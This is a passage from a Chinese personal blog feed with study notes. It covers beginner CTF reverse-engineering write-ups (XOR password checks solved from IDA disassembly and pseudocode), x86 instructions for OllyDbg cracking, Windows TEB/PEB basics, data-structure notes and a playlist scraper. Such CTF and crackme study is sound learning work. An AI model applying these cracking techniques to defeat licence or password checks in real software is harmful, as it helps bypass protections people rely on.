class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400707 loc_400707:                             ; CODE XREF: main+177↓j</span><br><span class="line">.text:0000000000400707                 lea     rdi, [rbp+s]    ; s</span><br><span class="line">.text:000000000040070B                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:000000000040070F                 mov     [rbp+var_88], rax</span><br><span class="line">.text:0000000000400716                 call    _strlen</span><br><span class="line">.text:000000000040071B                 mov     rdi, [rbp+var_88]</span><br><span class="line">.text:0000000000400722                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400725                 jnb     loc_4007AC</span><br><span class="line">.text:000000000040072B                 lea     rdi, [rbp+var_20] ; s</span><br><span class="line">.text:000000000040072F                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400733                 mov     [rbp+var_90], rax</span><br><span class="line">.text:000000000040073A                 call    _strlen</span><br><span class="line">.text:000000000040073F                 mov     rdi, [rbp+var_90]</span><br><span class="line">.text:0000000000400746                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400749                 jb      loc_400754</span><br><span class="line">.text:000000000040074F                 call    sub_4007C0</span><br><span class="line">.text:0000000000400754 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400754</span><br><span class="line">.text:0000000000400754 loc_400754:                             ; CODE XREF: main+119↑j</span><br><span class="line">.text:0000000000400754                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400758                 mov     cl, [rbp+rax+var_20]</span><br><span class="line">.text:000000000040075C                 mov     [rbp+var_55], cl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:0000000000400762                 cdq</span><br><span class="line">.text:0000000000400763                 idiv    [rbp+var_2C]</span><br><span class="line">.text:0000000000400766                 movsxd  rsi, edx</span><br><span class="line">.text:0000000000400769                 mov     cl, byte ptr [rbp+rsi+var_28]</span><br><span class="line">.text:000000000040076D                 mov     [rbp+var_56], cl</span><br><span class="line">.text:0000000000400770                 movsx   edx, [rbp+var_55]</span><br><span class="line">.text:0000000000400774                 movsx   edi, [rbp+var_56]</span><br><span class="line">.text:0000000000400778                 xor     edx, edi</span><br><span class="line">.text:000000000040077A                 mov     cl, dl</span><br><span class="line">.text:000000000040077C                 mov     [rbp+var_57], cl</span><br><span class="line">.text:000000000040077F                 movsxd  rsi, [rbp+var_54]</span><br><span class="line">.text:0000000000400783                 movsx   edx, [rbp+rsi+s]</span><br><span class="line">.text:0000000000400788                 movsx   edi, [rbp+var_57]</span><br><span class="line">.text:000000000040078C                 cmp     edx, edi</span><br><span class="line">.text:000000000040078E                 jz      loc_400799</span><br><span class="line">.text:0000000000400794                 call    sub_4007C0</span><br><span class="line">.text:0000000000400799 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400799</span><br><span class="line">.text:0000000000400799 loc_400799:                             ; CODE XREF: main+15E↑j</span><br><span class="line">.text:0000000000400799                 jmp     $+5</span><br><span class="line">.text:000000000040079E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040079E</span><br><span class="line">.text:000000000040079E loc_40079E:                             ; CODE XREF: main:loc_400799↑j</span><br><span class="line">.text:000000000040079E                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:00000000004007A1                 add     eax, 1</span><br><span class="line">.text:00000000004007A4                 mov     [rbp+var_54], eax</span><br><span class="line">.text:00000000004007A7                 jmp     loc_400707</span><br></pre></td></tr></table></figure><blockquote><p>ps:<br>CQD:<br>把edx的所有位设成eax最高位的值</p></blockquote><p>在最后的“jmp     loc_400707”实现循环<br>跳转到sub_4007C0后，就显示输入的密码错误   </p><p>由于不会分析了 就 看了伪代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560L</span>L;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    sub_4007C0(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其中v7可以转换为16进制再转换成字符串，所以v7在运算时变为”haramb”<br>得到flag的代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> k1[]=<span class="string">":\"AL_RT^L*.?+6/46"</span>;</span><br><span class="line"><span class="keyword">char</span> k2[]=<span class="string">"harambe"</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">7</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(k1);i++)&#123;</span><br><span class="line">s[i]=(<span class="keyword">char</span>)(*(k2+i%a)^k1[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="彦林学长给的一题"><a href="#彦林学长给的一题" class="headerlink" title="彦林学长给的一题"></a>彦林学长给的一题</h3><p>题在这边：<a href="https://zhangsi.lanzous.com/icfzx7c" target="_blank" rel="noopener">easyYM</a><br>看了他的wp<br>嗯…感觉自己知道 有flag的那块地方没有被调用，但一方面是不知道是哪些函数跟flag有关（通过查看字符串）(后来用ida打开发现，放在main函数里，刚开始就跳过了） ，另外就是没有想到od设置某处为新eip的功能</p><h1 id="装Pwntools"><a href="#装Pwntools" class="headerlink" title="装Pwntools"></a>装Pwntools</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h2><ul><li>广义表<br>广义表中的元素可以是一个单元素，也可以是另一个表。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Glist</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    Element Type Data;  <span class="comment">//用这个标志控制结点为单元素或者广义表</span></span><br><span class="line">    Glist anlist;</span><br><span class="line">  &#125;</span><br><span class="line">  Glist Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>广义表即为一个多重链表<br>多重链表中结点的指针域有多个（如anlist和Next）,包含两个指针域的链表不一定是多重链表(如双向链表)   </li></ul><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>数据对象集：有穷线性表<br>操作集：堆栈的长度、堆栈元素   </p><ol><li>生成长度为MaxSize的空堆栈</li><li>判断堆栈是否满了</li><li>将一个元素压入堆栈</li><li>判断堆栈是否为空</li><li>删除并返回栈顶元素<br>栈的顺序存储结构由一个<strong>一位数组</strong>和一个<strong>记录栈顶位置</strong>的变量top组成  </li></ol><h3 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h3><h4 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"堆栈满"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  s-&gt;data[s-&gt;top]=item;</span><br><span class="line">  (s-&gt;top)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top=<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"堆栈空"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  data=s-&gt;data[(s-&gt;top)--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h3><p>用一个单链表，称作链栈<br>top在链表的头结点，头结点里不存放其他元素   </p><h4 id="入栈-1"><a href="#入栈-1" class="headerlink" title="入栈"></a>入栈</h4><p><img src="https://s1.ax1x.com/2020/05/08/Ynrdv6.png" alt="Ynrdv6.png"></p><h4 id="出栈-1"><a href="#出栈-1" class="headerlink" title="出栈"></a>出栈</h4><p>记得free()<br><img src="https://s1.ax1x.com/2020/05/08/Ynr0KK.png" alt="Ynr0KK.png"></p><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>只能在一端插入（入队），在另一端删除（出队）<br>先进先出   </p><h3 id="顺序存储-1"><a href="#顺序存储-1" class="headerlink" title="顺序存储"></a>顺序存储</h3><p>一个一维数组+一个记录头元素的变量front+一个记录尾元素的变量rear<br>front指向第一个元素的前一个位置</p><ul><li>循环队列<br>当front和rear相等时为空（或相等）（解决方案：加入一个额外标记；使用n-1个空间）     </li></ul><p><img src="https://s1.ax1x.com/2020/05/08/YnrBDO.png" alt="YnrBDO.png"></p><h3 id="链式存储-1"><a href="#链式存储-1" class="headerlink" title="链式存储"></a>链式存储</h3><p>存在单链表中，front和rear指针分别指向头和尾</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;攻防世界新手题&quot;&gt;&lt;a href=&quot;#攻防世界新手题&quot; class=&quot;headerlink&quot; title=&quot;攻防世界新手题&quot;&gt;&lt;/a&gt;攻防世界新手题&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#RE&quot; class=&quot;headerlink&quot; title=&quot;RE&quot;&gt;&lt;/a&gt;RE&lt;/h2&gt;&lt;h3 id=&quot;insanity&quot;&gt;&lt;a href=&quot;#insanity&quot; class=&quot;headerlink&quot; title=&quot;insanity&quot;&gt;&lt;/a&gt;insanity&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://adworld.xctf.org.cn/task/answer?type=reverse&amp;amp;number=4&amp;amp;grade=0&amp;amp;id=5079&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://adworld.xctf.org.cn/task/answer?type=reverse&amp;amp;number=4&amp;amp;grade=0&amp;amp;id=5079&amp;amp;page=1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原来flag还能长”9447{This_is_a_flag}”这样….&lt;br&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="CTF" scheme="https://brubbish.github.io/tags/CTF/"/>
    
      <category term="数据结构" scheme="https://brubbish.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>一个爬取自己网易云歌单的爬虫</title>
    <link href="https://brubbish.github.io/53778.html"/>
    <id>https://brubbish.github.io/53778.html</id>
    <published>2020-05-03T07:13:30.000Z</published>
    <updated>2020-07-05T13:27:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>现在只弄了红心歌单<br>可以得出每个歌手的出现次数（不包括多人唱一首的情况）<br>还没有排序<br>也不能输出到文件<br>参考：<a href="https://blog.csdn.net/fu254983303/article/details/79434882" target="_blank" rel="noopener">https://blog.csdn.net/fu254983303/article/details/79434882</a><br><a id="more"></a><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">r=requests.get(<span class="string">'https://music.163.com/playlist?id=xxxxxxxxx'</span>,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">html=r.text</span><br><span class="line">reg_list = <span class="string">'&lt;ul class="f-hide"&gt;&lt;li&gt;(.*?)&lt;/ul&gt;'</span></span><br><span class="line">reg_list = re.compile(reg_list, re.S)</span><br><span class="line">content = re.findall(reg_list, html)</span><br><span class="line">reg = <span class="string">'&lt;a href="(.*?)"&gt;(.*?)&lt;/a&gt;&lt;/li&gt;'</span>  </span><br><span class="line">reg = re.compile(reg, re.S)</span><br><span class="line">song_list = re.findall(reg, content[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">singer=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    singer.append([<span class="number">0</span>]*<span class="number">2</span>)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> song_list:</span><br><span class="line">    url=<span class="string">"https://music.163.com"</span>+song_list[i][<span class="number">0</span>]</span><br><span class="line">    r=requests.get(url,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">    htm=r.text</span><br><span class="line">    reg_list2=<span class="string">'&lt;p class="des s-fc4"&gt;歌手：&lt;span title="(.*?)"&gt;'</span></span><br><span class="line">    reg_list2=re.compile(reg_list2,re.S)</span><br><span class="line">    s=re.findall(reg_list2,htm)</span><br><span class="line"></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j==k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">            singer[k][<span class="number">0</span>]=s</span><br><span class="line">            singer[k][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(singer)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在只弄了红心歌单&lt;br&gt;可以得出每个歌手的出现次数（不包括多人唱一首的情况）&lt;br&gt;还没有排序&lt;br&gt;也不能输出到文件&lt;br&gt;参考：&lt;a href=&quot;https://blog.csdn.net/fu254983303/article/details/79434882&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/fu254983303/article/details/79434882&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
    
      <category term="python" scheme="https://brubbish.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2020.04.27-2020.05.03</title>
    <link href="https://brubbish.github.io/59200.html"/>
    <id>https://brubbish.github.io/59200.html</id>
    <published>2020-05-03T07:00:30.000Z</published>
    <updated>2020-07-05T13:29:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows内核基础"><a href="#Windows内核基础" class="headerlink" title="Windows内核基础"></a>Windows内核基础</h1><h2 id="内核的数据结构"><a href="#内核的数据结构" class="headerlink" title="内核的数据结构"></a>内核的数据结构</h2><h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><p>TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。<br>包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB<br>用WinDbg的本地调试功能可以查看系统中的TEB结构<br><a id="more"></a></p><h4 id="TEB访问"><a href="#TEB访问" class="headerlink" title="TEB访问"></a>TEB访问</h4><p>可以通过NtCurrentTab函数调用和FS段寄存器访问两种方式访问TEB结构  </p><ol><li>NtCurrentTab<br>一个ntdll.dll中的函数，该函数可以返回当前线程TEB的地址  </li><li>FS段寄存器<br>当代码运行在r3时，fs指向的段的基地址即为当前线程的TEB</li></ol><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>PEB(Process Environment Block,进程环境块)存在于用户地址空间中，每个进程都有自己的PEB信息<br>PEB结构的地址放在TEB中，因此可以通过fs：[偏移量]访问PEB的地址</p><h1 id="使用OD从零开始Cracking"><a href="#使用OD从零开始Cracking" class="headerlink" title="使用OD从零开始Cracking"></a>使用OD从零开始Cracking</h1><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><ol><li>nop   </li><li>堆栈相关指令   <ol><li>push<br>push[内存地址]<br>push[eax]<br>push 数值</li></ol><ul><li>ptr：防止两个操作数不一样。<br>用byte/word/dword ptr指定内存单元的长度（字节、字、双字）  </li></ul><ol><li>pop   </li><li>pushad<br>按照eax、ecx、edx、ebx、esp、ebp、esi、edi的顺序把所有通用寄存器压入栈   </li><li>popad<br>把pushad入栈的值取出（顺序相反）   </li><li>16位程序中有pusha、popa</li></ol></li><li>赋值指令   <ol><li>mov   </li><li>movsx(操作有符号数)<br>第一个操作数的位数比第二个操作数多，第二个填充第一个的前面几位<br>填充的结果跟填充数字正负有关。用负数填充，结果的剩余部分填F；整数填充剩余部分填0。<br>如：用F000填EAX，结果为FFFFF000；用1234填EAX，结果为00001234.<br>(16位数的正数范围为0~7FFF，负数范围为8000~FFFF)</li><li>movzx（操作无符号数）<br>与movsx相似，但剩余部分总填充0</li><li>LEA<br>取地址指令，第一个操作数是通用寄存器，第二个是内存单元的地址（而不是值）<br>如”LEA EAX,DOWRD PTR DS:[ECX+38]”不是获取内存中[ECX+38],而要计算ECX+38的值，并赋给EAX   </li><li>XCHG<br>交换两个操作数的值，寄存器/内存单元和寄存器  <h2 id="数学指令"><a href="#数学指令" class="headerlink" title="数学指令"></a>数学指令</h2></li></ol></li><li>inc dec</li><li>add sub</li><li>adc (带进位的加法)<br>将两个操作数和进位标志（CF）的值相加放到第一个操作数中</li><li>SBB<br>计算（第一个操作数-第二个操作数）再减去进位标志，将结果 存到第一个操作数中</li><li>MUL<br>无符号数乘法。只有一个操作数，操作数和EAX相乘，结果放到EDX:EAX中</li><li>IMUL<br>用于有符号数的乘法<br>一个操作数时类似于MUL。<br>当有两个操作数时，两者相乘，结果放到第一个操作数中<br>当有三个操作数时，如，”IMUL EBP,DWORD PTR [ESI+74], FF800002”,意思是EBP=[ESI+74]*FF800002   </li><li>DIV(无符号)/IDIV(有符号)<br>DIV只有一个操作数，结果存放到EDX:EAX中<br>IDIV：<br>一个操作数时，于DIV相似<br>两个操作数时，第一个除以第二个，结果存放到第一个操作数中<br>三个操作数时，第二哥除以第一个，结果存放到第一个操作数中<br>（与IMUL类似）</li><li>XADD(交换并相加)<br>XCHG和ADD的组合，先将两个操作数交换数值，然后值相加赋给第一个操作数</li><li>NEG<br>取反</li></ol><h2 id="逻辑指令"><a href="#逻辑指令" class="headerlink" title="逻辑指令"></a>逻辑指令</h2><p>两个操作数，将两个操作数按位运算，并将结果存入第一个操作数中</p><ol><li>AND<br>两个二进制位都为1，结果为1，此外都为0</li><li>OR<br>有一位为1，结果就为1</li><li>XOR<br>不同取1，相同取0</li><li>NOT<br>取反（1-0，0-1）</li></ol><h1 id="两个攻防世界上的新手re题"><a href="#两个攻防世界上的新手re题" class="headerlink" title="两个攻防世界上的新手re题"></a>两个攻防世界上的新手re题</h1><p>其实没看出来哪跟re有关了  </p><h2 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1</a>   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag就是解出的hash值，没啥难度。（就是为了凑行数）</p><h2 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1</a></p><p>就用16进制编辑器打开然后搜索“flag”</p><h1 id="写了个爬自己网易云红心歌单的爬虫"><a href="#写了个爬自己网易云红心歌单的爬虫" class="headerlink" title="写了个爬自己网易云红心歌单的爬虫"></a>写了个爬自己网易云红心歌单的爬虫</h1><p><a href="https://brubbish.github.io/53778.html">一个爬取自己网易云歌单的爬虫</a>   </p><p>其实还没写完</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Windows内核基础&quot;&gt;&lt;a href=&quot;#Windows内核基础&quot; class=&quot;headerlink&quot; title=&quot;Windows内核基础&quot;&gt;&lt;/a&gt;Windows内核基础&lt;/h1&gt;&lt;h2 id=&quot;内核的数据结构&quot;&gt;&lt;a href=&quot;#内核的数据结构&quot; class=&quot;headerlink&quot; title=&quot;内核的数据结构&quot;&gt;&lt;/a&gt;内核的数据结构&lt;/h2&gt;&lt;h3 id=&quot;TEB&quot;&gt;&lt;a href=&quot;#TEB&quot; class=&quot;headerlink&quot; title=&quot;TEB&quot;&gt;&lt;/a&gt;TEB&lt;/h3&gt;&lt;p&gt;TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。&lt;br&gt;包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB&lt;br&gt;用WinDbg的本地调试功能可以查看系统中的TEB结构&lt;br&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
